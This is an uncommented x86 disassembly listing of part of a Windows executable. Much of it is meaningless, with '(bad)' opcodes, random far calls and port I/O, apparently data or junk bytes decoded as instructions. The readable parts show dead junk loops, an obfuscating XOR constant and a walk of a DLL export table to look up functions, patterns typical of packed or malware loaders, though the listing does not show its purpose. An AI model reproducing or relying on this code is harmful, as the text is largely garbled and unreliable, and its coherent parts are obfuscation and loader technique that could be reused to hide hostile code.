  4072e9:	lock mov DWORD PTR [edx],esp
  4072ec:	dec    ebx
  4072ed:	mov    ebp,0xa84b43d
  4072f2:	int    0xfc
  4072f4:	mov    al,BYTE PTR [edi-0xd]
  4072f7:	pop    ebp
  4072f8:	inc    ecx
  4072f9:	sbb    ebx,esp
  4072fb:	inc    edi
  4072fc:	xchg   DWORD PTR ds:0xa5ba30fd,edx
  407302:	shl    BYTE PTR [edi],cl
  407304:	cmp    al,0xc
  407306:	iret   
  407307:	cmc    
  407308:	mov    eax,ds:0x7bd01808
  40730d:	mov    ds:0xbff05d7d,eax
  407312:	popf   
  407313:	mov    DWORD PTR [ebp-0x1c],ecx
  407316:	and    DWORD PTR ds:0x4292a5,ebx
  40731c:	imul   edx,eax
  40731f:	neg    esi
  407321:	mov    ecx,0x4573
  407326:	add    edx,ecx
  407328:	mov    esi,0x7879
  40732d:	and    DWORD PTR ds:0x42c88e,0x0
  407337:	xor    edi,edi
  407339:	add    edi,DWORD PTR ds:0x42c88e
  40733f:	inc    edi
  407340:	mov    DWORD PTR ds:0x42c88e,edi
  407346:	cmp    DWORD PTR ds:0x42c88e,0x26
  40734d:	jne    0x407368
  407353:	push   0x70d3
  407358:	push   0x0
  40735a:	push   DWORD PTR [ebp-0x10]
  40735d:	push   0x5a5a
  407362:	call   DWORD PTR ds:0x427acf
  407368:	cmp    DWORD PTR ds:0x42c88e,0x19
  40736f:	jb     0x407337
  407375:	and    DWORD PTR ds:0x42c89e,0x0
  40737f:	mov    edi,DWORD PTR ds:0x42c89e
  407385:	inc    edi
  407386:	mov    DWORD PTR ds:0x42c89e,edi
  40738c:	cmp    DWORD PTR ds:0x42c89e,0xb
  407393:	jne    0x4073a5
  407399:	push   DWORD PTR [ebp-0x24]
  40739c:	push   DWORD PTR [ebp-0x14]
  40739f:	call   DWORD PTR ds:0x4279f7
  4073a5:	cmp    DWORD PTR ds:0x42c89e,0xa
  4073ac:	jne    0x4073bf
  4073b2:	mov    edi,DWORD PTR ds:0x42c89e
  4073b8:	inc    edi
  4073b9:	mov    DWORD PTR ds:0x42c89e,edi
  4073bf:	cmp    DWORD PTR ds:0x42c89e,0x1a
  4073c6:	jb     0x40737f
  4073cc:	xor    DWORD PTR ds:0x427d17,edx
  4073d2:	mov    edi,0x1556
  4073d7:	xchg   esi,ecx
  4073d9:	sub    edx,edi
  4073db:	sbb    ecx,DWORD PTR ds:0x4292d1
  4073e1:	xor    esi,esi
  4073e3:	mov    DWORD PTR [ebp-0x28],esi
  4073e6:	or     ecx,DWORD PTR ds:0x427d1f
  4073ec:	mov    DWORD PTR [ebp-0x2c],esi
  4073ef:	mov    ecx,DWORD PTR ds:0x42c886
  4073f5:	xor    DWORD PTR ds:0x42759c,ecx
  4073fb:	mov    DWORD PTR [ebp-0x14],esi
  4073fe:	and    DWORD PTR ds:0x4292c1,0x0
  407408:	jmp    0x40741c
  40740d:	xor    ecx,ecx
  40740f:	or     ecx,DWORD PTR ds:0x4292c1
  407415:	inc    ecx
  407416:	mov    DWORD PTR ds:0x4292c1,ecx
  40741c:	cmp    DWORD PTR ds:0x4292c1,0x12
  407423:	jae    0x4075d0
  407429:	cmp    DWORD PTR ds:0x4292c1,0x1e
  407430:	jne    0x40743c
  407436:	call   DWORD PTR ds:0x427ad3
  40743c:	jmp    0x40740d
  407441:	sub    ecx,0x7ae1
  407447:	jmp    0x4075d0
  40744c:	add    DWORD PTR [eax-0xd],edx
  40744f:	sbb    esp,DWORD PTR [ebp-0x5]
  407452:	cdq    
  407453:	push   0xffffffc7
  407455:	stos   BYTE PTR es:[edi],al
  407456:	cmp    eax,eax
  407458:	pop    edi
  407459:	(bad)  
  40745a:	jg     0x40742d
  40745c:	and    DWORD PTR [eax],0x7c
  40745f:	jl     0x407449
  407461:	jg     0x4074df
  407463:	jl     0x40747f
  407465:	cs pop eax
  407467:	sahf   
  407468:	lock mov eax,ds:0xfe625a9f
  40746e:	cmp    al,0xfc
  407470:	push   edi
  407471:	xor    ebx,eax
  407473:	(bad)  
  407474:	or     al,BYTE PTR [eax+esi*2-0x1630bfe6]
  40747b:	xchg   esp,eax
  40747c:	cmp    ecx,eax
  40747e:	ret    
  40747f:	and    dh,al
  407481:	bound  ebx,QWORD PTR [ecx]
  407483:	lock mov edi,DWORD PTR [esp+ebp*8-0x1f]
  407488:	pop    ss
  407489:	fdiv   QWORD PTR [ebp-0x401795f4]
  40748f:	nop
  407490:	mov    ah,0x6e
  407492:	scas   eax,DWORD PTR es:[edi]
  407493:	and    eax,0xa30be64d
  407498:	fs push eax
  40749a:	jmp    DWORD PTR [ebp-0x52]
  40749d:	popa   
  40749e:	hlt    
  40749f:	mov    ebx,DWORD PTR [ecx]
  4074a1:	stos   DWORD PTR es:[edi],eax
  4074a2:	mov    ds:0xb62859af,al
  4074a7:	mov    edx,0x507cbc1
  4074ac:	in     eax,dx
  4074ad:	or     esp,DWORD PTR [ebx]
  4074af:	ins    BYTE PTR es:[edi],dx
  4074b0:	mov    WORD PTR [ebx+0x6e],ss
  4074b3:	cmp    ah,cl
  4074b5:	outs   dx,DWORD PTR ds:[esi]
  4074b6:	push   eax
  4074b7:	fisttp QWORD PTR [ecx+0x56]
  4074ba:	or     dl,BYTE PTR [ecx+0x2070d957]
  4074c0:	cs dec esp
  4074c2:	(bad)  
  4074c3:	sbb    esp,DWORD PTR [ebx-0x27]
  4074c6:	pop    eax
  4074c7:	call   0xe91:0xd26bdbd8
  4074ce:	mov    dh,0xc8
  4074d0:	lods   al,BYTE PTR ds:[esi]
  4074d1:	repz cmp eax,0x81785426
  4074d7:	jb     0x4074b4
  4074d9:	dec    ecx
  4074da:	push   eax
  4074db:	stos   BYTE PTR es:[edi],al
  4074dc:	add    ecx,esp
  4074de:	xchg   edx,eax
  4074df:	cmp    bh,BYTE PTR [ebx*1+0x72f1b2a7]
  4074e6:	out    0xfd,al
  4074e8:	or     cl,BYTE PTR [eax+0x29]
  4074eb:	scas   al,BYTE PTR es:[edi]
  4074ec:	jnp    0x40751b
  4074ee:	arpl   bp,di
  4074f0:	call   0x4f9:0x96ee32f6
  4074f7:	cdq    
  4074f8:	pop    ds
  4074f9:	out    0x63,eax
  4074fb:	stos   DWORD PTR es:[edi],eax
  4074fc:	add    eax,0x5249af47
  407501:	dec    ebp
  407502:	pop    esi
  407503:	imul   ebp,DWORD PTR [esi-0xaf0e488],0x8c5353c2
  40750d:	cmp    al,0x2b
  40750f:	xchg   esp,eax
  407510:	and    DWORD PTR [ebp+ebp*2+0x41],0x2edfbdda
  407518:	mov    edi,0x39eedabd
  40751d:	push   ebx
  40751e:	fnstsw WORD PTR [ebp-0x74]
  407521:	ja     0x407538
  407523:	mov    eax,fs:0xd263d2a
  407529:	int3   
  40752a:	ret    0xee65
  40752d:	stos   BYTE PTR es:[edi],al
  40752e:	pop    eax
  40752f:	pushf  
  407530:	add    eax,0x88a2b6f8
  407535:	mov    ebp,0x45b4ed3
  40753a:	mov    eax,ds:0x50f394a9
  40753f:	(bad)
  407543:	aas    
  407544:	fisub  DWORD PTR [edi-0x69]
  407547:	mov    esi,0x4bcfe5a7
  40754c:	loopne 0x40756f
  40754e:	xchg   DWORD PTR [edx+0x65],ebp
  407551:	arpl   WORD PTR [eax+0x7f746114],si
  407557:	push   0x6ea6e449
  40755c:	shl    DWORD PTR [esp+ecx*8+0x72],1
  407560:	mov    bl,0xf7
  407562:	inc    esi
  407563:	add    DWORD PTR [esi+0x5b],eax
  407566:	mov    cl,0x14
  407568:	lea    esp,[eax+0x6e]
  40756b:	aas    
  40756c:	aad    0x4d
  40756e:	sbb    ebx,DWORD PTR [ecx-0x5b]
  407571:	popf   
  407572:	mov    dl,0xd3
  407574:	in     eax,dx
  407575:	inc    edx
  407576:	sahf   
  407577:	push   ebx
  407578:	fidiv  DWORD PTR [eax-0x2016f001]
  40757e:	cmc    
  40757f:	(bad)  
  407580:	fisttp DWORD PTR [ecx+eiz*1-0x5c4b0184]
  407587:	xor    bl,BYTE PTR [ecx]
  407589:	adc    eax,DWORD PTR [esi-0x47f3bb88]
  40758f:	adc    BYTE PTR [ebp+0x539be553],ch
  407595:	in     al,dx
  407596:	aam    0x12
  407598:	stos   BYTE PTR es:[edi],al
  407599:	retf   
  40759a:	mov    DWORD PTR [ebp-0x17],ebp
  40759d:	dec    ebp
  40759e:	imul   ebp,esp,0x8e4b166a
  4075a4:	lahf   
  4075a5:	pop    eax
  4075a6:	add    eax,ebp
  4075a8:	sbb    eax,DWORD PTR [edi]
  4075aa:	mov    ch,0x9f
  4075ac:	or     eax,0xab609ffd
  4075b1:	or     eax,0x62a9f78b
  4075b6:	(bad)  ds:[esi]
  4075b9:	loop   0x407617
  4075bb:	shl    BYTE PTR [edi+0x14],1
  4075be:	(bad)  [esi+0xbc6c2bb]
  4075c4:	into   
  4075c5:	aas    
  4075c6:	lods   al,BYTE PTR ds:[esi]
  4075c7:	inc    ebx
  4075c8:	aaa    
  4075c9:	jge    0x407627
  4075cb:	call   ecx
  4075cd:	push   esp
  4075ce:	add    BYTE PTR [ecx-0x74078a77],cl
  4075d4:	dec    ebp
  4075d5:	call   0xb6503e0d
  4075da:	add    eax,0x4292bd
  4075df:	add    eax,DWORD PTR ds:0x4275b0
  4075e5:	mov    ds:0x4292bd,eax
  4075ea:	xor    edi,edi
  4075ec:	and    eax,DWORD PTR ds:0x427594
  4075f2:	jmp    0x40777b
  4075f7:	dec    cl
  4075f9:	pushf  
  4075fa:	adc    dl,BYTE PTR [edi+0x6d]
  4075fd:	repnz ins DWORD PTR es:[edi],dx
  4075ff:	xchg   esi,eax
  407600:	dec    eax
  407601:	fstp   DWORD PTR [ebp-0x51]
  407604:	dec    ebp
  407605:	adc    ebx,DWORD PTR [edi+edi*2-0x178383de]
  40760c:	jg     0x40768a
  40760e:	jl     0x407596
  407610:	mov    edi,DWORD PTR [esp+edx*1-0x8]
  407614:	sar    BYTE PTR [ebp-0x59179329],0x15
  40761b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40761c:	or     BYTE PTR [ebx+0x247d9bc0],ah
  407622:	sbb    edi,esp
  407624:	dec    edi
  407625:	inc    ebp
  407626:	(bad)  
  407627:	scas   eax,DWORD PTR es:[edi]
  407628:	ja     0x4076a3
  40762a:	push   cs
  40762b:	jno    0x40766f
  40762d:	data16 jge 0x4075fc
  407630:	retf   
  407631:	ret    
  407632:	fld    DWORD PTR [edi-0x48854462]
  407638:	jnp    0x407658
  40763a:	retf   0xe8ff
  40763d:	pusha  
  40763e:	pop    edi
  40763f:	popa   
  407640:	mov    ebp,0x928ae7a
  407645:	add    ebx,edi
  407647:	aam    0xe1
  407649:	and    DWORD PTR [eax+edx*4],ebx
  40764c:	push   ss
  40764d:	add    dl,cl
  40764f:	dec    ebp
  407650:	xlat   BYTE PTR ds:[ebx]
  407651:	jmp    DWORD PTR ds:0xded860af
  407657:	inc    ecx
  407658:	xor    DWORD PTR [ebp+0xb97d988],edx
  40765e:	inc    edx
  40765f:	pop    ds
  407660:	dec    edx
  407661:	xchg   ebp,eax
  407662:	sbb    dh,ch
  407664:	loope  0x40766c
  407666:	adc    BYTE PTR [bp+si],dh
  407669:	jno    0x407623
  40766b:	xor    ah,ah
  40766d:	out    0xbc,eax
  40766f:	data16 xor bh,BYTE PTR [ebp-0x69bb8d6b]
  407676:	sar    DWORD PTR [edx],cl
  407678:	sub    DWORD PTR [ebp+0x60275e62],esp
  40767e:	aaa    
  40767f:	into   
  407680:	push   esi
  407681:	nop
  407682:	adc    al,0xf9
  407684:	rcr    DWORD PTR [ebp-0x1b94fe8],cl
  40768a:	cdq    
  40768b:	push   ebp
  40768c:	(bad)  [eax-0x23]
  40768f:	pusha  
  407690:	stos   DWORD PTR es:[edi],eax
  407691:	push   esi
  407692:	jno    0x407656
  407694:	imul   DWORD PTR [edi-0x502bf5e]
  40769a:	shr    BYTE PTR [ebp-0xa80b009],1
  4076a0:	cmp    al,0x2d
  4076a2:	and    al,0xfe
  4076a4:	fdiv   st(0),st
  4076a6:	xlat   BYTE PTR ds:[ebx]
  4076a7:	stos   BYTE PTR es:[edi],al
  4076a8:	jns    0x407702
  4076aa:	xlat   BYTE PTR ds:[ebx]
  4076ab:	int3   
  4076ac:	mov    eax,ds:0x70276439
  4076b1:	and    bh,dl
  4076b3:	dec    ebp
  4076b4:	jne    0x4076fe
  4076b6:	(bad)  [ebx-0x21]
  4076b9:	sub    ecx,esi
  4076bb:	add    al,al
  4076bd:	or     BYTE PTR [ebx-0x4f60f294],bl
  4076c3:	and    BYTE PTR [eax-0x6c],ah
  4076c6:	pushf  
  4076c7:	jb     0x4076a7
  4076c9:	neg    ah
  4076cb:	in     al,dx
  4076cc:	xor    DWORD PTR [ecx-0x1f],0x4e
  4076d0:	call   0xbad7:0xd5b6d075
  4076d7:	mov    cl,0x28
  4076d9:	mov    ds:0x47fc447,al
  4076de:	jnp    0x407756
  4076e0:	out    dx,al
  4076e1:	jnp    0x40771b
  4076e3:	mov    ebp,0x72cb7027
  4076e9:	pop    esi
  4076ea:	dec    ebp
  4076eb:	or     DWORD PTR [ebx],edi
  4076ed:	nop    DWORD PTR [edi]
  4076f0:	mov    ds:0x9f2e7677,eax
  4076f5:	clc    
  4076f6:	sub    BYTE PTR [edx*8-0x7bc46fad],bh
  4076fd:	fimul  WORD PTR [edi-0x444bd629]
  407703:	jmp    0xd4006dbb
  407708:	fstp   TBYTE PTR [edx-0x55]
  40770b:	jmp    0xecc1:0x379651d2
  407712:	jle    0x407715
  407714:	lds    ebx,FWORD PTR ds:[ebx+0x7ca30a9]
  40771b:	ret    
  40771c:	rcr    DWORD PTR [edx],cl
  40771e:	test   DWORD PTR [esi],esp
  407720:	(bad)  
  407721:	fcom   QWORD PTR [ebx+0x14]
  407724:	mov    ebx,0xb414b46f
  407729:	(bad)  
  40772a:	loopne 0x4076b0
  40772c:	sub    dh,0x3f
  40772f:	jp     0x4076cb
  407731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407732:	jmp    0x40773c
  407734:	pop    ss
  407735:	fisttp DWORD PTR [edx+esi*2-0x33]
  407739:	ins    BYTE PTR es:[edi],dx
  40773a:	push   ss
  40773b:	pop    esp
  40773c:	das    
  40773d:	jle    0x4076c0
  40773f:	inc    ebp
  407740:	push   ss
  407741:	push   0xf92b6aae
  407746:	cmp    esp,DWORD PTR [edi-0x53c5ae6a]
  40774c:	cli    
  40774d:	mov    ecx,0xa898a25c
  407752:	pop    esi
  407753:	jno    0x4077c8
  407755:	jle    0x4077d4
  407757:	dec    edi
  407758:	push   cs
  407759:	out    dx,al
  40775a:	lock call 0xdb80e696
  407760:	xchg   esp,eax
  407761:	mov    al,ds:0xfd2b60f3
  407766:	call   DWORD PTR [esi+edi*4-0x192176f7]
  40776d:	fincstp 
  40776f:	inc    edi
  407770:	adc    dl,BYTE PTR [esi+0x6e]
  407773:	ret    
  407774:	pop    esi
  407775:	lds    edi,FWORD PTR [ebx+eiz*1]
  407778:	push   edx
  407779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40777a:	dec    ebp
  40777b:	add    ecx,ebx
  40777d:	mov    DWORD PTR [ebp-0x20],ecx
  407780:	mov    eax,DWORD PTR [ebp-0x20]
  407783:	je     0x407a73
  407789:	and    DWORD PTR ds:0x42c882,0x0
  407793:	xor    eax,eax
  407795:	xor    eax,DWORD PTR ds:0x42c882
  40779b:	inc    eax
  40779c:	mov    ds:0x42c882,eax
  4077a1:	cmp    DWORD PTR ds:0x42c882,0x16
  4077a8:	jne    0x4077b9
  4077ae:	push   0x42785c
  4077b3:	call   DWORD PTR ds:0x427c77
  4077b9:	cmp    DWORD PTR ds:0x42c882,0x11
  4077c0:	jb     0x407793
  4077c6:	mov    eax,ds:0x42c88e
  4077cb:	xor    DWORD PTR ds:0x4292dd,eax
  4077d1:	mov    eax,DWORD PTR [ebp-0x4]
  4077d4:	xor    eax,0x7510857
  4077d9:	xor    DWORD PTR ds:0x4292c9,0x4292c1
  4077e3:	add    eax,ebx
  4077e5:	cmp    edi,eax
  4077e7:	jne    0x40788d
  4077ed:	sub    DWORD PTR ds:0x42759c,0x4275a4
  4077f7:	push   DWORD PTR [ebp+0x8]
  4077fa:	call   0x4063f7
  4077ff:	mov    DWORD PTR [ebp-0x20],eax
  407802:	xor    eax,eax
  407804:	add    eax,DWORD PTR ds:0x4292f5
  40780a:	xor    esi,esi
  40780c:	xor    esi,DWORD PTR ds:0x4278af
  407812:	sub    esi,eax
  407814:	sub    eax,DWORD PTR [eax+esi*1]
  407817:	mov    eax,DWORD PTR [ebp-0x4]
  40781a:	sub    esi,DWORD PTR ds:0x42c896
  407820:	mov    ecx,DWORD PTR [ebp-0x20]
  407823:	mov    esi,0x7510857
  407828:	xor    eax,esi
  40782a:	adc    DWORD PTR ds:0x4292b9,0x7173
  407834:	add    eax,ebx
  407836:	cmp    ecx,eax
  407838:	je     0x407a57
  40783e:	push   DWORD PTR [ebp-0x20]
  407841:	push   DWORD PTR [ebp+0x8]
  407844:	call   0x4064f3
  407849:	mov    DWORD PTR [ebp-0x14],eax
  40784c:	mov    eax,DWORD PTR [ebp-0x4]
  40784f:	mov    ecx,DWORD PTR [ebp-0x14]
  407852:	xor    eax,esi
  407854:	add    eax,ebx
  407856:	cmp    ecx,eax
  407858:	je     0x407a57
  40785e:	mov    eax,DWORD PTR [ebp-0x14]
  407861:	mov    eax,DWORD PTR [eax+0x18]
  407864:	mov    DWORD PTR [ebp-0x20],eax
  407867:	mov    eax,DWORD PTR [ebp-0x14]
  40786a:	mov    ecx,DWORD PTR [ebp+0x8]
  40786d:	add    ecx,DWORD PTR [eax+0x20]
  407870:	mov    DWORD PTR [ebp-0x28],ecx
  407873:	mov    eax,DWORD PTR [ebp-0x14]
  407876:	mov    ecx,DWORD PTR [ebp+0x8]
  407879:	add    ecx,DWORD PTR [eax+0x24]
  40787c:	mov    DWORD PTR [ebp-0x2c],ecx
  40787f:	mov    eax,DWORD PTR [ebp-0x14]
  407882:	mov    ecx,DWORD PTR [ebp+0x8]
  407885:	add    ecx,DWORD PTR [eax+0x1c]
  407888:	xor    esi,esi
  40788a:	mov    DWORD PTR [ebp-0x14],ecx
  40788d:	mov    eax,DWORD PTR [ebp-0x28]
  407890:	mov    ecx,DWORD PTR [ebp+0x8]
  407893:	add    ecx,DWORD PTR [eax+edi*4]
  407896:	lea    eax,[ebp-0x8]
  407899:	mov    DWORD PTR [ebp-0x30],ecx
  40789c:	push   eax
  40789d:	push   DWORD PTR [ebp-0x30]
  4078a0:	push   DWORD PTR [ebp+0xc]
  4078a3:	call   0x403932
  4078a8:	mov    eax,DWORD PTR [ebp-0x4]
  4078ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4078ae:	xor    eax,0x7510857
  4078b3:	add    eax,ebx
  4078b5:	jmp    0x407a3e
  4078ba:	retf   
  4078bb:	idiv   BYTE PTR [edi+0x6de9b5d6]
  4078c1:	lods   eax,DWORD PTR ds:[esi]
  4078c2:	out    0xb6,al
  4078c4:	scas   eax,DWORD PTR es:[edi]
  4078c5:	xchg   DWORD PTR ds:0xebc9e288,edi
  4078cb:	and    eax,0x7fe87c7c
  4078d0:	jl     0x40794e
  4078d2:	je     0x4078bc
  4078d4:	(bad)  
  4078d5:	push   ecx
  4078d6:	adc    ebx,edi
  4078d8:	pushf  
  4078d9:	dec    edi
  4078da:	or     dh,BYTE PTR [ebx-0x55439cf]
  4078e0:	add    bl,BYTE PTR [edx+0x5b]
  4078e3:	and    DWORD PTR [ecx],ebx
  4078e5:	repz jae 0x4078a7
  4078e8:	sbb    al,0x99
  4078ea:	xchg   esp,eax
  4078eb:	int    0xbe
  4078ed:	jbe    0x407940
  4078ef:	sti    
  4078f0:	xor    al,0xd0
  4078f2:	int    0x97
  4078f4:	scas   eax,DWORD PTR es:[edi]
  4078f5:	push   es
  4078f6:	sbb    al,0xbf
  4078f8:	int3   
  4078f9:	fnsetpm(287 only) 
  4078fb:	add    BYTE PTR [edx+0x6146a80a],0x6a
  407902:	add    DWORD PTR ds:0x5e82123c,eax
  407908:	lahf   
  407909:	mov    ds:0x3843ddcc,al
  40790e:	arpl   WORD PTR [ebx-0x26],bp
  407911:	ret    
  407912:	fimul  DWORD PTR [edi]
  407914:	pusha  
  407915:	cmp    edi,DWORD PTR [ebp+0x8]
  407918:	daa    
  407919:	imul   ecx,DWORD PTR [edx],0xd5b7f541
  40791f:	sbb    BYTE PTR [edx-0x35],bl
  407922:	inc    edx
  407923:	enter  0x7f73,0x5e
  407927:	hlt    
  407928:	jns    0x4078f8
  40792a:	jl     0x40795d
  40792c:	push   ds
  40792d:	add    ah,BYTE PTR [esi+0x5]
  407930:	xchg   BYTE PTR [edi-0x4f],bh
  407933:	mul    BYTE PTR [esi]
  407935:	or     DWORD PTR [ebx-0x686290cc],esi
  40793b:	test   al,0xb6
  40793d:	imul   edi,DWORD PTR [ecx],0x7ab67ea0
  407943:	std    
  407944:	imul   ebx,DWORD PTR [edx],0x3bb94544
  40794a:	or     cl,cl
  40794c:	pop    ecx
  40794d:	sbb    BYTE PTR [edi-0x3e],ah
  407950:	add    bl,BYTE PTR [ecx+0x67]
  407953:	sub    ebx,esp
  407955:	jne    0x4079c6
  407957:	or     al,0xbf
  407959:	jnp    0x4079c2
  40795b:	fisub  DWORD PTR [edi-0x51]
  40795e:	imul   ebp,DWORD PTR [esi+esi*1+0x78a27144],0xdc877c30
  407969:	add    DWORD PTR [ebx-0x33ef3dfd],ebp
  40796f:	add    ah,BYTE PTR [edi-0x6962b676]
  407975:	jne    0x407900
  407977:	dec    edx
  407978:	mov    ch,0xbf
  40797a:	adc    cl,BYTE PTR [esi+0x7a]
  40797d:	fcmovu st,st(1)
  40797f:	cdq    
  407980:	pop    dx
  407982:	js     0x4079de
  407984:	shl    DWORD PTR [edi+0x2774297d],0xb5
  40798b:	leave  
  40798c:	add    dl,ch
  40798e:	lds    esi,FWORD PTR [edi]
  407990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407991:	jge    0x407971
  407993:	jg     0x4079aa
  407995:	aam    0xbb
  407997:	out    0x92,al
  407999:	std    
  40799a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40799b:	cwde   
  40799c:	xor    DWORD PTR [ebp+0x6282702c],esp
  4079a2:	jecxz  0x40797e
  4079a4:	adc    al,0xbd
  4079a6:	inc    esi
  4079a7:	xlat   BYTE PTR ds:[ebx]
  4079a8:	fs je  0x4079b5
  4079ab:	inc    ebx
  4079ac:	fcomp  DWORD PTR [eax]
  4079ae:	cmp    eax,0xc822e31b
  4079b3:	xchg   ebx,eax
  4079b4:	gs xor esp,0x6c8ca39b
  4079bb:	lods   al,BYTE PTR ds:[esi]
  4079bc:	push   ebp
  4079bd:	stos   DWORD PTR es:[edi],eax
  4079be:	mov    ebp,0x26c674ed
  4079c3:	jge    0x4079e2
  4079c5:	cmp    al,0x8d
  4079c7:	out    0x6,eax
  4079c9:	pop    ebp
  4079cb:	and    eax,0x1a264a0f
  4079d0:	ror    BYTE PTR [edi],1
  4079d2:	or     ebx,eax
  4079d4:	out    0x94,eax
  4079d6:	cmc    
  4079d7:	pop    edx
  4079d8:	xchg   edi,eax
  4079d9:	stos   BYTE PTR es:[edi],al
  4079da:	adc    eax,0x5465d394
  4079df:	push   eax
  4079e0:	repnz mov edx,edx
  4079e3:	(bad)  
  4079e5:	jbe    0x407a29
  4079e7:	and    ebp,DWORD PTR [eax-0x80]
  4079ea:	imul   ebx,DWORD PTR [ebx-0x60],0xff479cdc
  4079f1:	xor    eax,0xc27559fc
  4079f6:	call   0x3887:0x20ca8bd7
  4079fd:	xlat   BYTE PTR ds:[ebx]
  4079fe:	test   BYTE PTR [ecx+esi*2+0x513a76d8],dh
  407a05:	pushf  
  407a06:	pop    edi
  407a07:	adc    eax,DWORD PTR ds:0x23e79d94
  407a0d:	sub    eax,0xb8cb1687
  407a12:	jge    0x407a5a
  407a14:	and    eax,0xf32378d7
  407a19:	mov    esp,0x7531a69f
  407a1e:	sub    BYTE PTR [edi+0x675e9c8a],al
  407a24:	xor    eax,0x33f47888
  407a29:	jo     0x4079cf
  407a2b:	shr    BYTE PTR [esi+0x57],1
  407a2e:	imul   eax,DWORD PTR [eax-0x18],0xfffffff5
  407a32:	pushf  
  407a33:	inc    edi
  407a34:	push   ss
  407a35:	test   al,0x8d
  407a37:	sub    al,0x62
  407a39:	pop    edi
  407a3a:	call   0x3b77091e
  407a3f:	enter  0x850f,0x1d
  407a43:	add    BYTE PTR [eax],al
  407a45:	add    BYTE PTR [ebx+0x3b47e045],cl
  407a4b:	clc    
  407a4c:	jb     0x407789
  407a52:	jmp    0x407a73
  407a57:	mov    eax,DWORD PTR [ebp-0x4]
  407a5a:	xor    eax,esi
  407a5c:	add    eax,ebx
  407a5e:	jmp    0x408b1b
  407a63:	mov    eax,DWORD PTR [ebp-0x2c]
  407a66:	movzx  eax,WORD PTR [eax+edi*2]
  407a6a:	mov    ecx,DWORD PTR [ebp-0x14]
  407a6d:	mov    eax,DWORD PTR [ecx+eax*4]
  407a70:	mov    DWORD PTR [ebp+0xc],eax
  407a73:	mov    eax,DWORD PTR [ebp-0x4]
  407a76:	mov    ecx,DWORD PTR [ebp-0x8]
  407a79:	xor    eax,0x7510857
  407a7e:	add    eax,ebx
  407a80:	cmp    ecx,eax
  407a82:	jne    0x407a95
  407a88:	mov    eax,DWORD PTR [ebp-0x4]
  407a8b:	xor    eax,0x7510857
  407a90:	jmp    0x407a5c
  407a95:	mov    eax,DWORD PTR [ebp+0xc]
  407a98:	add    eax,DWORD PTR [ebp+0x8]
  407a9b:	mov    DWORD PTR [ebp-0x10],eax
  407a9e:	mov    eax,DWORD PTR [ebp-0x1c]
  407aa1:	test   eax,eax
  407aa3:	je     0x4087bb
  407aa9:	mov    DWORD PTR [ebp-0x24],esi
  407aac:	push   0xb
  407aae:	pop    ecx
  407aaf:	push   0x5
  407ab1:	dec    ecx
  407ab2:	pop    ebx
  407ab3:	xchg   ebx,ecx
  407ab5:	sub    ebx,ecx
  407ab7:	xchg   ebx,ecx
  407ab9:	dec    ecx
  407aba:	jmp    0x407c43
  407abf:	adc    edi,DWORD PTR [eax+0x2d9d7285]
  407ac5:	mov    ds:0xbdc820bd,eax
  407aca:	inc    edx
  407acb:	(bad)  
  407acc:	in     al,dx
  407acd:	call   DWORD PTR [edi+eax*2+0x24]
  407ad1:	jl     0x407b4f
  407ad3:	call   0x44bcf757
  407ad8:	sub    ch,bl
  407ada:	in     eax,0x27
  407adc:	icebp  
  407add:	pop    ebp
  407ade:	out    dx,al
  407adf:	mov    dl,0x6b
  407ae1:	sbb    BYTE PTR [edx+0x7652b561],0x91
  407ae8:	dec    edx
  407ae9:	sbb    esi,DWORD PTR [esi]
  407aeb:	xchg   edi,eax
  407aec:	xlat   BYTE PTR ds:[ebx]
  407aed:	outs   dx,BYTE PTR ds:[esi]
  407aee:	fbld   TBYTE PTR [ebx]
  407af0:	xchg   BYTE PTR [ebx],dh
  407af2:	fxch   st(2)
  407af4:	loop   0x407a88
  407af6:	rcr    DWORD PTR [edx-0x3b],0xe7
  407afa:	mov    ds:0x614d253b,al
  407aff:	xor    eax,DWORD PTR [esi+0x61817ba0]
  407b05:	mov    WORD PTR [ecx+eax*8],gs
  407b08:	jo     0x407b13
  407b0a:	fnstsw WORD PTR [ebx+0x25c1fd0]
  407b10:	sbb    DWORD PTR [eax],esi
  407b12:	ins    BYTE PTR es:[edi],dx
  407b13:	pop    edi
  407b14:	pop    es
  407b15:	pop    ss
  407b16:	add    edi,edi
  407b18:	mov    esi,0x48d12bf8
  407b1d:	int3   
  407b1e:	mov    al,0x98
  407b20:	das    
  407b21:	fisubr DWORD PTR [edi-0x25]
  407b24:	ins    DWORD PTR es:[edi],dx
  407b25:	mov    eax,0x21a5ef7b
  407b2a:	sbb    al,0xed
  407b2c:	jne    0x407ba4
  407b2e:	jmp    0x407b2a
  407b30:	out    0x67,al
  407b32:	add    al,BYTE PTR [edi]
  407b34:	repz pop ecx
  407b36:	dec    ebp
  407b37:	and    eax,0xdbd8241b
  407b3c:	mov    eax,0xfc115913
  407b41:	inc    edx
  407b42:	out    0xe9,eax
  407b44:	cmp    dl,BYTE PTR [edi+0x1b]
  407b47:	dec    edi
  407b48:	(bad)  
  407b49:	xchg   esi,eax
  407b4a:	test   eax,0x94a034a7
  407b4f:	cdq    
  407b50:	call   0x13f5:0xfda6a3b1
  407b57:	cmp    DWORD PTR [ebp-0x7f5675b],esp
  407b5d:	or     BYTE PTR [ebx+esi*4+0x64],ah
  407b61:	jge    0x407bde
  407b63:	xchg   ecx,eax
  407b64:	and    eax,0x1b51e4ab
  407b69:	inc    eax
  407b6a:	jns    0x407be8
  407b6c:	jo     0x407bb2
  407b6e:	ror    BYTE PTR [edx-0x492642d6],cl
  407b74:	jp     0x407b55
  407b76:	jmp    0x6969:0x778eda64
  407b7d:	dec    ecx
  407b7e:	jmp    0x2871:0xafca1399
  407b85:	jmp    0x407be7
  407b87:	push   ss
  407b88:	pop    edx
  407b89:	aas    
  407b8a:	pop    es
  407b8b:	retf   
  407b8c:	test   ch,0x8a
  407b8f:	retf   
  407b90:	mov    WORD PTR [esp+ebp*8],ss
  407b93:	fwait
  407b94:	mov    ds:0xd14c436d,al
  407b99:	mov    bl,0x6d
  407b9b:	shr    BYTE PTR [eax-0x62],0xf6
  407b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ba0:	ret    
  407ba1:	mov    bh,0xe
  407ba3:	mov    cl,BYTE PTR [edx+esi*2-0xd]
